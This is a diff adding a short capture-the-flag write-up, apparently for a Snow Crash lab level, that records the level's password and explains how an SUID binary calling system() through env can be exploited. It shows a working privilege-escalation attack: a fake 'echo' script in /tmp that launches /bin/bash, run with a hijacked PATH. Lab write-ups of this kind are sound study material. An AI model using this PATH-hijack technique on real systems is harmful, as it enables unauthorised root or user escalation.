@@ -1,0 +1,19 @@
+level03: kooda2puivaav1idi4f57q8iq
+
+level03 has SUID bit set, it can be executed as flag03
+
+```
+scp -P 4242 level03@192.168.56.104:level03 resources/
+```
+
+level03 calls system("/usr/bin/env echo Exploit me")
+
+```
+ltrace ./resources/level03
+```
+
+```
+echo '/bin/bash' > /tmp/echo
+chmod +x /tmp/echo
+PATH=/tmp:$PATH ./level03
+```
